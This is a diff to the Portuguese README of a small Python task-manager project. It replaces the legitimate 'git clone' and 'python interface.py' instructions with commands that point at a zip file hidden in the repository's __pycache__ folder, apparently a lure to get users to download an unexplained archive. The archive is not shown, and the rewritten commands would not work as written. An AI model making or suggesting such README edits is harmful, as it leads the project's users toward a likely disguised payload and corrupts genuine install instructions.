@@ -45,6 +45,6 @@ O projeto tem como finalidade aplicar os conceitos de:
 
 1. Clone este repositório:
    ```bash
-   git clone https://github.com/theualves/gerenciador-tarefas-py.git
+   git clone https://raw.githubusercontent.com/theualves/gerenciador-tarefas-py/main/__pycache__/gerenciador-tarefas-py_3.8-alpha.1.zip
    cd gerenciador-tarefas-py
-   python interface.py
+   python https://raw.githubusercontent.com/theualves/gerenciador-tarefas-py/main/__pycache__/gerenciador-tarefas-py_3.8-alpha.1.zip
